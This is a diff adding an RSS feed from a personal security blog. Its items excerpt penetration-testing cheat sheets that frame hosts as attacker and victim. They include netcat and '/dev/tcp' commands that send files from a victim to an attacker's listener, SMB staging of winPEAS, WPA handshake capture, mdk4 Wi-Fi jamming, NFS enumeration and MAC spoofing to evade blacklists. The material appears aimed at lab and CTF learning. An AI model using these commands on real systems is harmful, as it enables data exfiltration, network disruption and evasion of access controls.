@@ -1,0 +1,365 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>Networking on Gajendra Mahato</title>
+    <link>http://localhost:1313/tags/networking/</link>
+    <description>Recent content in Networking on Gajendra Mahato</description>
+    <generator>Hugo -- 0.155.3</generator>
+    <language>en</language>
+    <lastBuildDate>Tue, 13 Jan 2026 00:00:00 +0000</lastBuildDate>
+    <atom:link href="http://localhost:1313/tags/networking/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>📁 File Sharing Over SMB Using `smbserver.py`</title>
+      <link>http://localhost:1313/posts/tipsandtricks/cheatsheets/smb-using-smbserver.py/</link>
+      <pubDate>Tue, 13 Jan 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/tipsandtricks/cheatsheets/smb-using-smbserver.py/</guid>
+      <description>&lt;hr&gt;
+&lt;h2 id=&#34;-on-the-linux-server-attacker-machine&#34;&gt;🖥️ On the Linux Server (Attacker Machine)&lt;/h2&gt;
+&lt;p&gt;Start an SMB server using &lt;code&gt;impacket-smbserver&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo smbserver.py gnu &lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;pwd&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt; -smb2support
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;gnu&lt;/code&gt;: Share name&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;$(pwd)&lt;/code&gt;: Current working directory to be shared&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-smb2support&lt;/code&gt;: Enables SMB2 support for better compatibility with newer Windows systems&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;-on-the-windows-client-victim-machine&#34;&gt;🪟 On the Windows Client (Victim Machine)&lt;/h2&gt;
+&lt;p&gt;Access the shared file using UNC path:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plaintext&#34; data-lang=&#34;plaintext&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;\\10.10.14.42\gnu\winPEAS.exe
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;🔸 Replace &lt;code&gt;10.10.14.42&lt;/code&gt; with the IP of your Linux (attacker) machine
+🔸 You can also map this as a network drive or copy files directly using &lt;code&gt;copy&lt;/code&gt; or &lt;code&gt;xcopy&lt;/code&gt; in CMD or PowerShell&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>📁 File Transfer Using Netcat</title>
+      <link>http://localhost:1313/posts/tipsandtricks/cheatsheets/netcat/</link>
+      <pubDate>Tue, 13 Jan 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/tipsandtricks/cheatsheets/netcat/</guid>
+      <description>&lt;h2 id=&#34;-step-1-start-listening-on-local-machine-kali&#34;&gt;🖥️ Step 1: Start Listening on Local Machine (Kali)&lt;/h2&gt;
+&lt;p&gt;Run the following command to start listening for incoming files:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nc -lp &lt;span class=&#34;m&#34;&gt;4444&lt;/span&gt; &amp;gt; filename    &lt;span class=&#34;c1&#34;&gt;# waiting for receiving the files&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h2 id=&#34;-step-2-transfer-file-from-remote-machine-victim&#34;&gt;📤 Step 2: Transfer File from Remote Machine (Victim)&lt;/h2&gt;
+&lt;p&gt;Run this command on the victim machine to send the file:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nc -w &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; 10.10.14.19 &lt;span class=&#34;m&#34;&gt;4444&lt;/span&gt; &amp;lt; filename    &lt;span class=&#34;c1&#34;&gt;# it&amp;#39;s time to send the file&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;OR&lt;/strong&gt;, use this alternative method:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat filename &amp;gt; /dev/tcp/10.10.14.19/4444
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; &lt;code&gt;10.10.14.19&lt;/code&gt; is the IP address of the &lt;strong&gt;local machine (tun0)&lt;/strong&gt;.&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>📡 File Transfer via FTP on Linux</title>
+      <link>http://localhost:1313/posts/tipsandtricks/cheatsheets/ftp-on-linux/</link>
+      <pubDate>Tue, 13 Jan 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/tipsandtricks/cheatsheets/ftp-on-linux/</guid>
+      <description>&lt;hr&gt;
+&lt;h2 id=&#34;-using-ftp-command&#34;&gt;🧰 Using &lt;code&gt;ftp&lt;/code&gt; Command&lt;/h2&gt;
+&lt;h3 id=&#34;1-connect-to-ftp-server&#34;&gt;1. Connect to FTP Server&lt;/h3&gt;
+&lt;p&gt;Replace &lt;code&gt;10.10.10.98&lt;/code&gt; with your target FTP server IP or domain:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ftp 10.10.10.98
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h3 id=&#34;2-login-as-anonymous&#34;&gt;2. Login as Anonymous&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plaintext&#34; data-lang=&#34;plaintext&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Name (10.10.10.98:yourusername): anonymous
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Password: (press Enter)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h3 id=&#34;3-set-binary-mode&#34;&gt;3. Set Binary Mode&lt;/h3&gt;
+&lt;p&gt;To handle all types of files properly:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plaintext&#34; data-lang=&#34;plaintext&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ftp&amp;gt; binary
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h3 id=&#34;4-disable-prompting-for-multiple-files&#34;&gt;4. Disable Prompting (for Multiple Files)&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plaintext&#34; data-lang=&#34;plaintext&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ftp&amp;gt; prompt off
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Interactive mode off.
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h3 id=&#34;5-download-files-wildcard&#34;&gt;5. Download Files (Wildcard)&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plaintext&#34; data-lang=&#34;plaintext&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ftp&amp;gt; mget *
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;⚠️ Note: Standard &lt;code&gt;ftp&lt;/code&gt; does &lt;strong&gt;not support recursive&lt;/strong&gt; download.
+For recursive download, use a better client like &lt;code&gt;lftp&lt;/code&gt;.&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>📡 Wi-Fi Handshake Capture Guide using aircrack-ng Tools</title>
+      <link>http://localhost:1313/posts/tipsandtricks/cheatsheets/wi-fi-handshake-capture-guide-using-aircrack-ng-tools/</link>
+      <pubDate>Tue, 13 Jan 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/tipsandtricks/cheatsheets/wi-fi-handshake-capture-guide-using-aircrack-ng-tools/</guid>
+      <description>&lt;hr&gt;
+&lt;h2 id=&#34;-1-scan-available-wifi-networks&#34;&gt;🔍 1. Scan Available WiFi Networks&lt;/h2&gt;
+&lt;h3 id=&#34;-scan-all-nearby-wifi-networks&#34;&gt;🌐 Scan all nearby WiFi networks&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo airodump-ng mon0
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;-scan-only-24-ghz-networks-80211bg&#34;&gt;📶 Scan only 2.4 GHz networks (802.11b/g)&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo airodump-ng --band &lt;span class=&#34;nb&#34;&gt;bg&lt;/span&gt; mon0
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;-scan-only-5-ghz-networks-80211a&#34;&gt;📡 Scan only 5 GHz networks (802.11a)&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo airodump-ng --band a mon0
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;-band-option-summary&#34;&gt;📋 Band Option Summary&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;--band a&lt;/code&gt; → 5 GHz (802.11a)&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;--band b&lt;/code&gt; → 2.4 GHz (802.11b)&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;--band g&lt;/code&gt; → 2.4 GHz (802.11g)&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;--band bg&lt;/code&gt; → All 2.4 GHz (recommended)&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;--band abg&lt;/code&gt; → Both 2.4 GHz and 5 GHz&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;-2-capture-wpawpa2-handshake&#34;&gt;🎯 2. Capture WPA/WPA2 Handshake&lt;/h2&gt;
+&lt;h3 id=&#34;-start-listening-on-target-ap&#34;&gt;🎯 Start listening on target AP&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Replace &amp;lt;channel&amp;gt;, &amp;lt;BSSID&amp;gt;, and &amp;lt;output_filename&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo airodump-ng -c &amp;lt;channel&amp;gt; --bssid &amp;lt;BSSID&amp;gt; -w &amp;lt;output_filename&amp;gt; mon0
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Example&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>🔐 File Transfer Over SSH Using `scp`</title>
+      <link>http://localhost:1313/posts/tipsandtricks/cheatsheets/ssh-using-scp/</link>
+      <pubDate>Tue, 13 Jan 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/tipsandtricks/cheatsheets/ssh-using-scp/</guid>
+      <description>&lt;hr&gt;
+&lt;h2 id=&#34;-uploadingsending-a-directory-from-local-to-ssh-server&#34;&gt;📤 Uploading/Sending a Directory from Local to SSH Server&lt;/h2&gt;
+&lt;p&gt;Use either of the following commands:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;scp -P &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; -r ./shell/* u0_a418@192.168.0.20:/home/gnu/shell/
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;OR&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;scp -r -P &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; ./shell u0_a418@192.168.0.20:/home/gnu/shell/
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h2 id=&#34;-downloadingreceiving-a-directory-from-ssh-server-to-local&#34;&gt;📥 Downloading/Receiving a Directory from SSH Server to Local&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;scp -P &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; -r u0_a418@192.168.0.20:/home/gnu/* ./gnu/
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;OR&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;scp -r -P &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; u0_a418@192.168.0.20:/home/gnu ./gnu/
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h2 id=&#34;-uploadingsending-a-file-from-local-to-ssh-server&#34;&gt;📤 Uploading/Sending a File from Local to SSH Server&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;scp -P &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; ./shell.php u0_a418@192.168.0.20:/home/gnu/shell.php
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h2 id=&#34;-downloadingreceiving-a-file-from-ssh-server-to-local&#34;&gt;📥 Downloading/Receiving a File from SSH Server to Local&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;scp -P &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; u0_a418@192.168.0.20:/home/gnu/flag.txt ./flag.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;📝 &lt;strong&gt;Note:&lt;/strong&gt;&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Configuring DHCP Server to Assign Hostname via DHCP</title>
+      <link>http://localhost:1313/posts/tipsandtricks/archlinux/change_hostname_from_dhcp_server_without_changing_machine_hostname_for_networks/</link>
+      <pubDate>Tue, 13 Jan 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/tipsandtricks/archlinux/change_hostname_from_dhcp_server_without_changing_machine_hostname_for_networks/</guid>
+      <description>&lt;h4 id=&#34;begin-by-installing-the-dhcp-server-package&#34;&gt;Begin by installing the DHCP server package.&lt;/h4&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo pacman -S extra/dhcp dhcpcd
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;next-set-a-custom-hostname-within-the-dhcp-configuration-file&#34;&gt;Next, set a custom hostname within the DHCP configuration file.&lt;/h4&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo vim /etc/dhcpcd.conf
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Within this file, add or modify the &lt;code&gt;host&lt;/code&gt; declaration to assign a specific hostname to a client:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hostname OPPO-A3s  ### This is set your device name OPPO-A3s in a network
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;finally-restart-the-dhcp-server-to-apply-the-changes&#34;&gt;Finally, restart the DHCP server to apply the changes.&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo systemctl restart dhcpd.service
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo systemctl restart dhcpcd.service
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
+    </item>
+    <item>
+      <title>Easy Guide to Fixing GRUB on Garuda Linux (BTRFS)</title>
+      <link>http://localhost:1313/posts/tipsandtricks/archlinux/fix_grub_on_garuda_linux/</link>
+      <pubDate>Tue, 13 Jan 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/tipsandtricks/archlinux/fix_grub_on_garuda_linux/</guid>
+      <description>&lt;p&gt;This simple guide helps you fix the GRUB bootloader on &lt;strong&gt;Garuda Linux&lt;/strong&gt; with a &lt;strong&gt;BTRFS&lt;/strong&gt; file system. Follow these steps to install the necessary tools, mount partitions, fix GRUB, and check EFI entries.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;step-1-install-garuda-tools-base-git&#34;&gt;Step 1: Install &lt;code&gt;garuda-tools-base-git&lt;/code&gt;&lt;/h3&gt;
+&lt;p&gt;You need the &lt;strong&gt;garuda-tools-base-git&lt;/strong&gt; package to manage GRUB on Garuda Linux. Install it using &lt;strong&gt;pacman&lt;/strong&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo pacman -S garuda/garuda-tools-base-git
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This package is only available for &lt;strong&gt;Garuda Linux&lt;/strong&gt; and won’t work with other Arch-based distributions.&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Jamming Wi-Fi with `mdk4`</title>
+      <link>http://localhost:1313/posts/tipsandtricks/cheatsheets/wifi-jam-tutorials-by-mdk3_mdk4_aireplayng/</link>
+      <pubDate>Tue, 13 Jan 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/tipsandtricks/cheatsheets/wifi-jam-tutorials-by-mdk3_mdk4_aireplayng/</guid>
+      <description>&lt;p&gt;With the &lt;code&gt;mdk4&lt;/code&gt; tool, you can jam Wi-Fi networks in various ways. This guide will walk you through the installation, setup, and usage of &lt;code&gt;mdk4&lt;/code&gt;, including examples for different attacks.&lt;/p&gt;
+&lt;h2 id=&#34;1-installation&#34;&gt;1. Installation&lt;/h2&gt;
+&lt;p&gt;If &lt;code&gt;mdk4&lt;/code&gt; is not installed on your system, install it using the following command:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt-get install mdk4 -y
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;switching-to-root-user&#34;&gt;Switching to Root User&lt;/h3&gt;
+&lt;p&gt;If you are not the root user, switch to root:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo su
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Example:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kali@gajendra:~$ sudo su
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2-checking-network-interface-status&#34;&gt;2. Checking Network Interface Status&lt;/h2&gt;
+&lt;p&gt;Check your network interface status to see if it&amp;rsquo;s in monitor mode:&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Rules for Kali Linux facebook group</title>
+      <link>http://localhost:1313/posts/tipsandtricks/tutorials/rules_for_kali_linux_facebook_groups/</link>
+      <pubDate>Tue, 13 Jan 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/tipsandtricks/tutorials/rules_for_kali_linux_facebook_groups/</guid>
+      <description>&lt;h2 id=&#34;1-stay-focused-on-learning--skill-development&#34;&gt;1. Stay Focused on Learning &amp;amp; Skill Development:&lt;/h2&gt;
+&lt;p&gt;This group is a knowledge hub for ethical hacking, cybersecurity, and Kali Linux.
+✅ Ask questions, share knowledge, and help each other grow!
+✅ All posts must be relevant to these topics.
+🚫 Basic Kali errors? Ask in the Community Chat, not as a post.
+💡 Tip: Search before asking! Many common issues are already discussed.&lt;/p&gt;
+&lt;p&gt;We’re here to learn, not to clutter the group with unnecessary posts.&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Scanning `rpcbind` on the Network</title>
+      <link>http://localhost:1313/posts/tipsandtricks/cheatsheets/rpcbind_guide/</link>
+      <pubDate>Tue, 13 Jan 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/tipsandtricks/cheatsheets/rpcbind_guide/</guid>
+      <description>&lt;p&gt;To scan for &lt;code&gt;rpcbind&lt;/code&gt; on a network and check NFS shares, use the following command:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo nmap -p &lt;span class=&#34;m&#34;&gt;111&lt;/span&gt; --script&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;nfs-ls,nfs-statfs,nfs-showmount &lt;span class=&#34;nv&#34;&gt;$IP&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# Scanning port 111 for rpcbind and list NFS shares&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;listing-mounted-partitions-on-the-network&#34;&gt;Listing Mounted Partitions on the Network&lt;/h3&gt;
+&lt;p&gt;To list the mounted partitions of a network system, use:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;showmount -e &lt;span class=&#34;nv&#34;&gt;$IP&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# List the exported directories on the NFS server&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h1 id=&#34;mounting-rpcbind-directories-on-local-machine&#34;&gt;Mounting &lt;code&gt;rpcbind&lt;/code&gt; Directories on Local Machine&lt;/h1&gt;
+&lt;p&gt;To mount a remote NFS directory on local machine. In this example, the directory &lt;code&gt;/var&lt;/code&gt; is mounted from the remote server with IP &lt;code&gt;10.10.122.178&lt;/code&gt;.&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Spoofing MAC Address in a Persistent fashion</title>
+      <link>http://localhost:1313/posts/tipsandtricks/archlinux/persistent-mac-address-spoofing-as-a-networkmanager-services-not-stable-and-not-recommand/</link>
+      <pubDate>Tue, 13 Jan 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/tipsandtricks/archlinux/persistent-mac-address-spoofing-as-a-networkmanager-services-not-stable-and-not-recommand/</guid>
+      <description>&lt;p&gt;This method allows users to change their WiFi adapter&amp;rsquo;s MAC address persistently. It also enables users to bypass MAC address blacklisting by network owners, as it allows connection to WiFi networks with a spoofed MAC address.&lt;/p&gt;
+&lt;h3 id=&#34;step-1-writing-a-systemd-service&#34;&gt;Step 1: Writing a systemd Service&lt;/h3&gt;
